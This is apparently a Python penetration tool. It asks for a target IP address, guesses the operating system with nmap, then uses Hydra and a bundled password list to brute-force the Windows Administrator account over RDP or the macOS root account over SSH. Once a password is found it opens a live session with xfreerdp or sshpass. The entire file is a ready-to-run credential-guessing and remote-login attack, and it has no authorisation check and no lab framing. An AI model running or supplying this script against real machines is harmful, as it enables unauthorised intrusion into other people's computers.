#!/usr/bin/env python3
import re
import os
import subprocess
import time
import sys
import pkg_resources
from colorama import init, Fore, Style
from termcolor import colored
from .animation import banner

init(autoreset=True)

def validate_ip(target_ip):
    ip_pattern = re.compile(r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$')
    return bool(ip_pattern.match(target_ip))

def detect_os(target_ip):
    try:
        nmap_command = [
            'sudo', 'nmap', '-O', '--osscan-guess', '--fuzzy',
            '-p', '22,80,443,3389',
            '--min-rate=10000',
            target_ip
        ]
        print(f"Running nmap to detect the operating system on {target_ip}...")
        result = subprocess.run(nmap_command, capture_output=True, text=True, check=True)
        nmap_output = result.stdout

        if re.search(r'Mac OS X|macOS', nmap_output, re.IGNORECASE):
            return 'mac'
        elif re.search(r'ms-wbt-server', nmap_output, re.IGNORECASE):
            return 'windows'

        print(f"Nmap output:\n{nmap_output}")

    except subprocess.CalledProcessError as e:
        print(colored(f"Error detecting OS: {e}. Nmap output: {e.stderr}", 'red'))
    
    return None

def run_hydra(target_ip, password_file, wait_time=1):
    """
    Runs Hydra for brute-forcing depending on the target OS and connects using xfreerdp for Windows or SSH for macOS.
    """
    try:
        target_os = detect_os(target_ip)
        if not target_os:
            print(colored(f"Could not determine the operating system of the target: {target_ip}.", 'red'))
            return

        if target_os == 'windows':
            hydra_command = [
                'hydra', '-W', str(wait_time), '-l', 'Administrator',
                '-P', password_file, f'rdp://{target_ip}'
            ]
            print(f"Starting Hydra for RDP brute-force attack on Windows with wait time {wait_time}...")
            result = subprocess.run(hydra_command, capture_output=True, text=True, check=True)
            hydra_output = result.stdout
            print("Hydra RDP brute-force attack completed.")

            match = re.search(r'\[3389\]\[rdp\] host: {}.*?password: (\S+)'.format(target_ip), hydra_output, re.DOTALL)
            if match:
                password_success = match.group(1)
                print(colored(f"Found successful password: {password_success}", 'blue'))
                time.sleep(5)
                xfreerdp_command = ['xfreerdp', f'/u:Administrator', f'/p:{password_success}', f'/v:{target_ip}']
                print(f"Connecting to {target_ip} using xfreerdp...")
                subprocess.run(xfreerdp_command, check=True)
                print(colored(f"Connected to {target_ip} using xfreerdp.", 'blue'))
            else:
                print(colored("No successful password found for RDP.", 'red'))
        
        elif target_os == 'mac':
            hydra_command = [
                'hydra', '-W', str(wait_time), '-l', 'root',
                '-P', password_file, f'ssh://{target_ip}'
            ]
            print(f"Starting Hydra for SSH brute-force attack on macOS with wait time {wait_time}...")
            result = subprocess.run(hydra_command, capture_output=True, text=True, check=True)
            hydra_output = result.stdout
            print("Hydra SSH brute-force attack completed.")

            match = re.search(r'\[22\]\[ssh\] host: {}.*?password: (\S+)'.format(target_ip), hydra_output, re.DOTALL)
            if match:
                password_success = match.group(1)
                print(colored(f"Found successful password: {password_success}", 'blue'))
                time.sleep(5)
                ssh_command = ['sshpass', '-p', password_success, 'ssh', f'root@{target_ip}']
                print(f"Connecting to {target_ip} using SSH...")
                subprocess.run(ssh_command, check=True)
                print(colored(f"Connected to {target_ip} using SSH.", 'blue'))
            else:
                print(colored("No successful password found for SSH.", 'red'))
    
    except subprocess.CalledProcessError as e:
        print(colored(f"Error executing command: {e}", 'red'))
        print(colored(f"Hydra stdout:\n{e.stdout}", 'red'))
        print(colored(f"Hydra stderr:\n{e.stderr}", 'red'))
    
    except KeyboardInterrupt:
        print("\nProcess interrupted by user. Exiting...")
        sys.exit(0)



def main():
    banner()

    while True:
        try:
            target_ip = input(
                'Enter the target IP of the device (Windows or macOS, e.g., 192.168.xx.xx): '
            ).strip()
            if validate_ip(target_ip):
                break
            else:
                print(colored(
                    "Invalid IP address format. Please enter a valid IP (e.g., 192.168.xx.xx).",
                    'red'
                ))
        except KeyboardInterrupt:
            print("\nProcess interrupted by user. Exiting...")
            sys.exit(0)
    password_file = pkg_resources.resource_filename('src', 'assets/pass.txt')

    try:
        run_hydra(target_ip, password_file, wait_time=3)
    except KeyboardInterrupt:
        print("\nProcess interrupted by user. Exiting...")


if __name__ == "__main__":
    main()
